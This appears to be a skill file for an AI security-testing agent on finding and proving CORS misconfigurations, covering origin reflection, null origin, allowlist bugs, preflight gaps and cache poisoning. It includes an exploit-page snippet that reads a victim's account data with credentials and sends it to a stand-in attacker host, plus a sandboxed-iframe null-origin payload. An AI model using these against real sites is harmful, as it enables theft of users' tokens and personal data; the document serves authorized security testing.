---
name: cors_misconfiguration
description: CORS misconfiguration testing covering origin reflection, null origin, credential-bearing reads, preflight gaps, and cache poisoning via missing Vary
---

# CORS Misconfiguration

Cross-Origin Resource Sharing is the browser mechanism that decides whether a foreign origin may read a response. It is not an access-control boundary - it is a relaxation of the same-origin policy, and it only matters when it lets an attacker's page read data the victim can see. Misconfigurations turn a logged-in victim's browser into a proxy for the attacker, usually to steal tokens, PII, or CSRF tokens. The key distinction: a CORS finding is only real if the attacker can read something sensitive with the victim's credentials.

## Attack Surface

- API/JSON endpoints that return user-specific data (profile, orders, settings)
- Endpoints returning CSRF/anti-CSRF tokens, session markers, or bearer tokens in bodies
- GraphQL, REST, and microservice responses with per-request `Access-Control-Allow-Origin` (ACAO)
- Preflight handling (`OPTIONS`) that diverges from actual request handling
- CDN/cache layers that serve CORS headers without `Vary: Origin`
- Subdomain-heavy deployments where one relaxed origin covers attacker-influenceable subdomains

## Reconnaissance

1. **Identify credential-bearing endpoints** - anything that behaves differently when cookies/Authorization headers are present
2. **Probe the CORS profile** on each endpoint:
   - `Origin: https://attacker.example` - is it reflected?
   - `Origin: null` - accepted?
   - `Origin: https://victim.example.attacker.example` / `https://attacker.example.com` (substring confusion)?
   - `Origin: https://evilvictim.example` (prefix confusion)?
3. **Check preflight vs simple request**: an `OPTIONS` with `Access-Control-Request-Method: GET` and the same Origin; compare ACAO/`Access-Control-Allow-Credentials` (ACAC) to the actual `GET`
4. **Check `Vary: Origin`** on every response that emits ACAO; its absence can enable cache poisoning
5. **Test with credentials**: `curl -H "Origin: https://attacker.example" -H "Cookie: session=..."` and confirm ACAC is true when ACAO is a non-wildcard origin

## Key Vulnerabilities

### Reflected Origin with Credentials

The server copies the request `Origin` into ACAO and sets ACAC true. Any origin can read the response with the victim's cookies:

```
curl -s -H "Origin: https://attacker.example" -H "Cookie: session=..." https://target/api/me -D-
```

Exploit page:

```
fetch("https://target/api/me", {credentials: "include"})
  .then(r => r.json())
  .then(d => new Image().src = "https://attacker.example/?d=" + JSON.stringify(d));
```

### `null` Origin Accepted

`Origin: null` is sent by sandboxed iframes, `data:`/`file:` documents, and some redirect chains. If the server reflects `null` with credentials, a sandboxed iframe on the attacker page can make credentialed reads:

```
<iframe sandbox="allow-scripts" srcdoc="...fetch('https://target/api/me',{credentials:'include'})..."></iframe>
```

### Wildcard with Credentials

`Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` is rejected by spec-compliant browsers, but:

- Legacy/Safari edge cases historically sent cookies anyway
- Non-browser clients (mobile apps, curl, automation) are unaffected
- It still exposes unauthenticated data that should be private (info disclosure)

### Allowlist Bugs

- Substring match: `attacker.com` passes a check for `attacker.com` suffix in `victim.attacker.com`
- Prefix match: `attacker.com.evil.com` passes a check starting with `attacker.com`
- Domain-only check that ignores port or protocol
- Trusting subdomains that are attacker-controllable (user-generated content, file upload, `xss.victim.com`)

### Per-Endpoint Divergence

- Root/API prefix has strict CORS but a specific endpoint (uploads, exports, callbacks) reflects any origin
- Preflight says no but simple requests (`text/plain`, form-encoded) still return readable data

### Missing `Vary: Origin` (Cache Poisoning)

A CDN/cache stores one CORS response per URL. Without `Vary: Origin`, a response generated for `Origin: https://attacker.example` is served to other users, giving the attacker's origin read access to cached authenticated responses (combine with the `web_cache_poisoning` skill).

## Advanced Techniques

- **Credentials via `withCredentials`**: only exploitable when ACAC is true; prove both headers in the same response
- **Token theft without ACAC**: if the response contains an anti-CSRF token but ACAC is false, an uncredentialed cross-origin read may still leak it when the endpoint returns it without cookies
- **CORB/CORP bypass**: responses with `Content-Type: application/json` are protected by CORB in some browsers; `text/html`, `text/plain`, or JSONP endpoints are readable - target those
- **CORS + XSS chain**: an XSS on any allowed origin makes credentialed cross-origin reads irrelevant; when XSS exists on an allowed subdomain, the CORS flaw is redundant but still worth reporting for defense-in-depth
- **Redirect chains**: `Origin` may be stripped or rewritten across redirects; test final-hop behavior separately

## Testing Methodology

1. Enumerate authenticated, data-returning endpoints
2. Map the per-endpoint CORS profile (reflected, null, wildcard, allowlist, credentials, Vary)
3. Build a minimal cross-origin proof: fetch with `credentials:"include"` from a test page (or a `curl` pair showing both ACAO and ACAC)
4. Confirm the attacker origin can actually read sensitive, victim-specific data
5. Check preflight and simple-request divergence, and cache-layer behavior

## Validation

1. Show the exact response headers (`Access-Control-Allow-Origin` + `Access-Control-Allow-Credentials`) for an attacker-chosen Origin
2. Demonstrate a cross-origin credentialed read of victim-specific data (two accounts: one request differs only by the `Origin` header)
3. For null-origin cases, show the sandboxed-iframe or `data:` context that produces `Origin: null`
4. Confirm `Vary: Origin` absence with a cache-hit/second-user proof where caching applies

## False Positives

- ACAO reflected but ACAC false and no sensitive data readable - at most low severity
- Wildcard ACAO without credentials serving intentionally public data
- Browser-side CORB/CORP blocking JSON reads even when headers look permissive
- Origin reflected into ACAO but the endpoint requires a header the attacker cannot set cross-origin (custom auth header without credentials mode)
- `OPTIONS` permissive but actual GET/POST rejects the origin (always test the real request, not just preflight)

## Impact

- Account takeover via token/cookie theft from authenticated endpoints
- Mass PII exposure for any victim who visits the attacker page
- State-changing CSRF amplification (read tokens, then use them)
- Cache poisoning of authenticated responses across users

## Pro Tips

1. Always send cookies/Authorization when testing; CORS is only interesting with credentials
2. Test `Origin: null` - it is frequently accepted and trivially reachable from attacker pages
3. Verify `Vary: Origin` on every CORS response; missing Vary is a separate cache-poisoning finding
4. Test per endpoint, not per host - configs drift (uploads, exports, callbacks, GraphQL)
5. Distinguish "reflects Origin" (common, not always a finding) from "attacker can read victim data" (a finding)
6. Prefer the real browser (`agent-browser`) for final proof; curl cannot prove browser-enforced credential reads

## Summary

A CORS misconfiguration is a data-exfiltration primitive: it lets an attacker's page read victim-authenticated responses. Verify with real headers on real requests, prove a credentialed read of sensitive data, check preflight divergence and cache behavior, and report with the exact origin/header pair.
